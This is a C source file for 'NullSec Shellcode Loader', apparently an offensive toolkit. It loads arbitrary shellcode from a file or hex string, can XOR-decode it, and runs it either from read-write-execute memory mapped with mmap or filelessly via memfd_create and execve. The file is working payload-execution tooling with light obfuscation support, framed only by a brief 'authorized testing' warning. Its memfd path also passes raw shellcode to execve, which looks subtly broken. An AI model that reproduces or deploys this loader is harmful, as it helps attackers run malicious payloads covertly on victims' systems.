/*
 * NullSec Shellcode Loader
 * Memory injection and shellcode execution toolkit
 * Author: bad-antics | GitHub: bad-antics | Discord: discord.gg/killers
 * 
 * WARNING: For authorized security testing and research only.
 * 
 * Compile: gcc -o nullsec-shellcode nullsec-shellcode.c -z execstack
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>

#define VERSION "1.0.0"
#define MAX_SHELLCODE_SIZE 65536

const char* BANNER = 
"╔═══════════════════════════════════════════════════════════╗\n"
"║     ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗   ║\n"
"║     ████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝   ║\n"
"║     ██╔██╗ ██║██║   ██║██║     ██║     ███████╗█████╗     ║\n"
"║     ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██╔══╝     ║\n"
"║     ██║ ╚████║╚██████╔╝███████╗███████╗███████║███████╗   ║\n"
"║     ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝   ║\n"
"║              SHELLCODE LOADER (C) - RESEARCH              ║\n"
"║            bad-antics | bad-antics | discord.gg/killers  ║\n"
"╚═══════════════════════════════════════════════════════════╝\n";

// XOR decode shellcode
void xor_decode(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

// Convert hex string to bytes
int hex_to_bytes(const char *hex, unsigned char *out, size_t max_len) {
    size_t len = strlen(hex);
    if (len % 2 != 0) return -1;
    
    size_t out_len = len / 2;
    if (out_len > max_len) return -1;
    
    for (size_t i = 0; i < out_len; i++) {
        char byte_str[3] = { hex[i*2], hex[i*2+1], '\0' };
        out[i] = (unsigned char)strtol(byte_str, NULL, 16);
    }
    
    return out_len;
}

// Read shellcode from file
int read_shellcode(const char *path, unsigned char *buf, size_t max_len) {
    FILE *f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "[-] Cannot open file: %s\n", path);
        return -1;
    }
    
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (size > (long)max_len) {
        fprintf(stderr, "[-] Shellcode too large: %ld bytes\n", size);
        fclose(f);
        return -1;
    }
    
    size_t read = fread(buf, 1, size, f);
    fclose(f);
    
    return read;
}

// Execute shellcode using mmap
int exec_mmap(unsigned char *shellcode, size_t len) {
    printf("[*] Allocating executable memory...\n");
    
    void *exec_mem = mmap(NULL, len, 
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    if (exec_mem == MAP_FAILED) {
        fprintf(stderr, "[-] mmap failed: %s\n", strerror(errno));
        return -1;
    }
    
    printf("[*] Copying shellcode to %p\n", exec_mem);
    memcpy(exec_mem, shellcode, len);
    
    printf("[*] Executing shellcode (%zu bytes)...\n", len);
    ((void(*)())exec_mem)();
    
    munmap(exec_mem, len);
    return 0;
}

// Execute using memfd_create (fileless)
int exec_memfd(unsigned char *shellcode, size_t len) {
    printf("[*] Creating memory file descriptor...\n");
    
    int fd = memfd_create("", MFD_CLOEXEC);
    if (fd < 0) {
        fprintf(stderr, "[-] memfd_create failed: %s\n", strerror(errno));
        return -1;
    }
    
    if (write(fd, shellcode, len) != (ssize_t)len) {
        fprintf(stderr, "[-] write failed\n");
        close(fd);
        return -1;
    }
    
    printf("[*] Executing from memfd...\n");
    
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    
    char *argv[] = { fd_path, NULL };
    char *envp[] = { NULL };
    
    execve(fd_path, argv, envp);
    
    fprintf(stderr, "[-] execve failed: %s\n", strerror(errno));
    close(fd);
    return -1;
}

void print_shellcode(unsigned char *buf, size_t len) {
    printf("\n[*] Shellcode (%zu bytes):\n", len);
    for (size_t i = 0; i < len; i++) {
        if (i % 16 == 0) printf("    ");
        printf("\\x%02x", buf[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    if (len % 16 != 0) printf("\n");
}

void usage(const char *prog) {
    printf("Usage: %s [options]\n", prog);
    printf("\nOptions:\n");
    printf("  -f <file>      Load shellcode from binary file\n");
    printf("  -x <hex>       Load shellcode from hex string\n");
    printf("  -k <key>       XOR decode with key (0-255)\n");
    printf("  -m <method>    Execution method: mmap, memfd (default: mmap)\n");
    printf("  -d             Dump shellcode (don't execute)\n");
    printf("  -h             Show this help\n");
    printf("\nExamples:\n");
    printf("  %s -f payload.bin\n", prog);
    printf("  %s -x '4831c048b8...' -k 0x41\n", prog);
    printf("\nWARNING: For authorized testing only!\n");
}

int main(int argc, char *argv[]) {
    printf("%s\n", BANNER);
    
    unsigned char shellcode[MAX_SHELLCODE_SIZE];
    size_t shellcode_len = 0;
    unsigned char xor_key = 0;
    int use_xor = 0;
    int dump_only = 0;
    char *method = "mmap";
    char *input_file = NULL;
    char *hex_input = NULL;
    
    int opt;
    while ((opt = getopt(argc, argv, "f:x:k:m:dh")) != -1) {
        switch (opt) {
            case 'f':
                input_file = optarg;
                break;
            case 'x':
                hex_input = optarg;
                break;
            case 'k':
                xor_key = (unsigned char)strtol(optarg, NULL, 0);
                use_xor = 1;
                break;
            case 'm':
                method = optarg;
                break;
            case 'd':
                dump_only = 1;
                break;
            case 'h':
            default:
                usage(argv[0]);
                return opt == 'h' ? 0 : 1;
        }
    }
    
    // Load shellcode
    if (input_file) {
        int len = read_shellcode(input_file, shellcode, MAX_SHELLCODE_SIZE);
        if (len < 0) return 1;
        shellcode_len = len;
        printf("[+] Loaded %zu bytes from %s\n", shellcode_len, input_file);
    } else if (hex_input) {
        int len = hex_to_bytes(hex_input, shellcode, MAX_SHELLCODE_SIZE);
        if (len < 0) {
            fprintf(stderr, "[-] Invalid hex string\n");
            return 1;
        }
        shellcode_len = len;
        printf("[+] Parsed %zu bytes from hex\n", shellcode_len);
    } else {
        fprintf(stderr, "[-] No shellcode input specified\n");
        usage(argv[0]);
        return 1;
    }
    
    // XOR decode if requested
    if (use_xor) {
        printf("[*] XOR decoding with key 0x%02x\n", xor_key);
        xor_decode(shellcode, shellcode_len, xor_key);
    }
    
    // Dump or execute
    if (dump_only) {
        print_shellcode(shellcode, shellcode_len);
        return 0;
    }
    
    // Execute
    if (strcmp(method, "mmap") == 0) {
        return exec_mmap(shellcode, shellcode_len);
    } else if (strcmp(method, "memfd") == 0) {
        return exec_memfd(shellcode, shellcode_len);
    } else {
        fprintf(stderr, "[-] Unknown method: %s\n", method);
        return 1;
    }
    
    return 0;
}
